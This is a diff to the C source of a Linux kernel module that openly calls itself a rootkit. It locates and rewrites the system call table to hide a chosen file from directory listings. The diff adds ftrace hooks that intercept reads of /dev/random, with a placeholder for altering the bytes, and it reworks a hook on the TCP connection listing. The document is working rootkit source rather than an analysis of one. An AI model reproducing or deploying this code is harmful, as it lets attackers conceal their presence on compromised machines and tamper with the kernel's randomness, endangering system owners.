@@ -24,10 +24,24 @@ unsigned long *sys_call_table;
 asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
 asmlinkage int new_getdents64(const struct pt_regs *regs);
 
-static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
-static int new_tcp4_seq_show(struct seq_file *seq, void *v);
+static asmlinkage int (*old_tcp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v);
+
+static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
+static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
 
 char* file_to_hide; 
+
+
+// static struct ftrace_hook hooks[] = {
+// 	HOOK("tcp4_seq_show", new_tcp4_seq_show, &old_tcp4_seq_show),
+// };
+
+static struct ftrace_hook hooks[] = {
+	HOOK("random_read", hook_random_read, &orig_random_read),
+    };
+
+
 
 // parameters from command line
 module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
@@ -36,7 +50,7 @@ module_param(file_to_hide, charp, 0000);
 MODULE_PARM_DESC(file_to_hide, "file to hide from getdents64 syscall");
 
 
-
+/* those functions are used for changing the syscalls in the syscall_table*/
 int set_addr_rw(unsigned long _addr) {
 
         unsigned int level;
@@ -50,7 +64,6 @@ int set_addr_rw(unsigned long _addr) {
 
         return 0;
 }
-
 // function to change addr page to ro.
 int set_addr_ro(unsigned long _addr) {
 
@@ -62,17 +75,17 @@ int set_addr_ro(unsigned long _addr) {
 
         return 0;
 }
+/*---------------------------------------------------------------------------*/
+
 
 static int __init rootkit_enter(void) {
+ int err;
 
  printk(KERN_INFO "rootkit is operating\n");
 
- //kallsyms_lookup_name_ = (void*)kallsyms_lookup_addr;
  populate_kallsyms_lookup_name(kallsyms_lookup_addr);
- sys_call_table= (unsigned long*)kallsyms_lookup_name_("sys_call_table");
+ sys_call_table=(unsigned long*)kallsyms_lookup_name_("sys_call_table");
 
- tcp4_seq_show = (void*)kallsyms_lookup_name_("tcp4_seq_show");
- printk(KERN_INFO "found tcp4 function: %lx\n", tcp4_seq_show);
  printk(KERN_INFO "found sys_call_table address: %lx\n",sys_call_table);
  
  // save old getdents64 function
@@ -88,6 +101,11 @@ static int __init rootkit_enter(void) {
  
 
 
+	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+	if(err)
+		return err;
+
+
  return 0;
 }
 
@@ -97,7 +115,8 @@ static void __exit rootkit_exit(void) {
  set_addr_rw((unsigned long)sys_call_table);
  sys_call_table[__NR_getdents64] = old_getdents64;
  set_addr_ro((unsigned long)sys_call_table);
-
+ //remove ftrace hooks
+ fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  printk(KERN_INFO "rootkit stopped\n");
 }
 
@@ -185,3 +204,31 @@ asmlinkage int new_getdents64(const struct pt_regs *regs)
 module_init(rootkit_enter);
 module_exit(rootkit_exit);
 
+
+
+static int new_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+	printk(KERN_INFO "hooked a call to tcp4_seq_show");
+	return old_tcp4_seq_show(seq, v);
+}
+
+
+
+
+
+
+
+
+
+
+static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
+{
+    int bytes_read;
+
+    bytes_read = orig_random_read(file, buf, nbytes, ppos);
+    printk(KERN_DEBUG "rootkit: intercepted read to /dev/random: %d bytes\n", bytes_read);
+
+    /* do something to buf */
+
+    return bytes_read;
+}
